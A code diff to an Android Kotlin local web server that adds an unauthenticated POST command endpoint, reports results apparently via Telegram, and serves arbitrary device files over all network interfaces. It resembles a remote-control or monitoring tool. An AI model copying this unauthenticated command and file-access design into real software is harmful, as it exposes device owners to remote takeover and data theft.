@@ -10,6 +10,8 @@ import java.io.InputStream
 
 class LocalWebServer(private val context: Context, port: Int) : NanoHTTPD("::", port) {
 
+    private val commandHandler = CommandHandler(context)
+
     override fun serve(session: IHTTPSession): Response {
         val uri = session.uri
         val method = session.method
@@ -20,15 +22,33 @@ class LocalWebServer(private val context: Context, port: Int) : NanoHTTPD("::", 
             uri == "/" || uri == "/index.html" -> serveAsset("index.html", "text/html")
             uri.startsWith("/api/info") -> serveDeviceInfo()
             uri.startsWith("/api/files") -> serveFileManager(session)
-            uri.startsWith("/api/camera/stream") -> serveCameraStream()
+            uri.startsWith("/api/command") && method == Method.POST -> handleDirectCommand(session)
             else -> newFixedLengthResponse(Response.Status.NOT_FOUND, MIME_PLAINTEXT, "404 Not Found")
         }
     }
 
-    private fun serveCameraStream(): Response {
-        // MJPEG Stream Implementation
-        // This is a simplified version. A real one would pipe camera frames.
-        return newFixedLengthResponse(Response.Status.OK, "multipart/x-mixed-replace; boundary=--frame", "Stream implementation required")
+    private fun handleDirectCommand(session: IHTTPSession): Response {
+        return try {
+            val map = mutableMapOf<String, String>()
+            session.parseBody(map)
+            val jsonStr = map["postData"] ?: "{}"
+            
+            // Execute command and wait for immediate response (synchronous part)
+            val result = commandHandler.handle(jsonStr) { /* Ignore async callback for direct web requests */ }
+            
+            if (result != null) {
+                newFixedLengthResponse(Response.Status.OK, "application/json", result)
+            } else {
+                // Command is async (like recording), return a placeholder
+                val asyncResp = JSONObject().apply {
+                    put("type", "async_started")
+                    put("data", "Command started in background. Result will be in Telegram/Logs.")
+                }
+                newFixedLengthResponse(Response.Status.OK, "application/json", asyncResp.toString())
+            }
+        } catch (e: Exception) {
+            newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, "Error: ${e.message}")
+        }
     }
 
     private fun serveAsset(fileName: String, mimeType: String): Response {
@@ -45,12 +65,13 @@ class LocalWebServer(private val context: Context, port: Int) : NanoHTTPD("::", 
             put("status", "online")
             put("model", android.os.Build.MODEL)
             put("android_version", android.os.Build.VERSION.RELEASE)
+            put("ipv6", "Enabled")
         }
         return newFixedLengthResponse(Response.Status.OK, "application/json", info.toString())
     }
 
     private fun serveFileManager(session: IHTTPSession): Response {
-        val path = session.parameters["path"]?.get(0) ?: "/"
+        val path = session.parameters["path"]?.get(0) ?: "/storage/emulated/0"
         val file = File(path)
 
         if (!file.exists()) {
@@ -66,7 +87,7 @@ class LocalWebServer(private val context: Context, port: Int) : NanoHTTPD("::", 
                     put("size", it.length())
                 }
             } ?: emptyList()
-            newFixedLengthResponse(Response.Status.OK, "application/json", filesList.toString())
+            newFixedLengthResponse(Response.Status.OK, "application/json", filesList.joinToString(",", "[", "]"))
         } else {
             try {
                 val inputStream: InputStream = FileInputStream(file)
@@ -78,13 +99,16 @@ class LocalWebServer(private val context: Context, port: Int) : NanoHTTPD("::", 
     }
 
     private fun resolveMimeType(fileName: String): String {
+        val name = fileName.lowercase()
         return when {
-            fileName.endsWith(".html") -> "text/html"
-            fileName.endsWith(".js") -> "application/javascript"
-            fileName.endsWith(".css") -> "text/css"
-            fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") -> "image/jpeg"
-            fileName.endsWith(".png") -> "image/png"
-            fileName.endsWith(".mp4") -> "video/mp4"
+            name.endsWith(".html") -> "text/html"
+            name.endsWith(".js") -> "application/javascript"
+            name.endsWith(".css") -> "text/css"
+            name.endsWith(".jpg") || name.endsWith(".jpeg") -> "image/jpeg"
+            name.endsWith(".png") -> "image/png"
+            name.endsWith(".mp4") -> "video/mp4"
+            name.endsWith(".txt") -> "text/plain"
+            name.endsWith(".pdf") -> "application/pdf"
             else -> "application/octet-stream"
         }
     }
